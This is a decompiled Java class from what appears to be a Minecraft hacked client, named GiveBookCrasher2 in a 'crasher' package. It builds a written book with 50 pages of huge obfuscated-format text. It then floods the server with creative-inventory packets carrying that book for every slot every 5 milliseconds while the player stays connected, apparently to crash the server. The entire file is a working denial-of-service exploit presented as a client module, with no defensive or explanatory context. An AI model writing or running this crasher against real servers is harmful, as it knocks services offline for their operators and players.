// 
// Decompiled by Procyon v0.6.0
// 

package me.amkgre.bettercraft.client.mods.crasher.gbc;

import net.minecraft.network.Packet;
import net.minecraft.network.play.client.CPacketCreativeInventoryAction;
import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.client.Minecraft;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.item.ItemStack;
import net.minecraft.init.Items;

public class GiveBookCrasher2
{
    public static void start() {
        new Thread() {
            @Override
            public void run() {
                final ItemStack Item2 = new ItemStack(Items.WRITTEN_BOOK);
                final NBTTagList List2 = new NBTTagList();
                final NBTTagCompound Compound2 = new NBTTagCompound();
                Minecraft.getMinecraft();
                final String Author = Minecraft.getSession().getUsername();
                final String Titel = "Play with me.";
                final String Gr\u00f6\u00dfe = "§4§l§kwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,97§4§l§k8iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,§4§l§k97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb5§4§l§k4yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h§4§l§k97,i567yb§4§l§k64t5";
                for (int i2 = 0; i2 < 50; ++i2) {
                    final String Content = "§4§l§kwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,97§4§l§k8iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,§4§l§k97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb5§4§l§k4yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h§4§l§k97,i567yb§4§l§k64t5";
                    final NBTTagString String2 = new NBTTagString("§4§l§kwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,97§4§l§k8iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,§4§l§k97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb5§4§l§k4yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h§4§l§k97,i567yb§4§l§k64t5");
                    List2.appendTag(String2);
                }
                Compound2.setString("author", Author);
                Compound2.setString("title", "Play with me.");
                Compound2.setTag("pages", List2);
                Item2.setTagInfo("pages", List2);
                Item2.setTagCompound(Compound2);
                while (Minecraft.getMinecraft().player != null) {
                    try {
                        for (int i3 = 0; i3 < Minecraft.getMinecraft().player.inventory.getSizeInventory(); ++i3) {
                            Minecraft.getMinecraft().getConnection().getNetworkManager().sendPacket(new CPacketCreativeInventoryAction(i3, Item2));
                        }
                        Thread.sleep(5L);
                    }
                    catch (final Exception e2) {
                        e2.printStackTrace();
                    }
                }
            }
        }.start();
    }
}
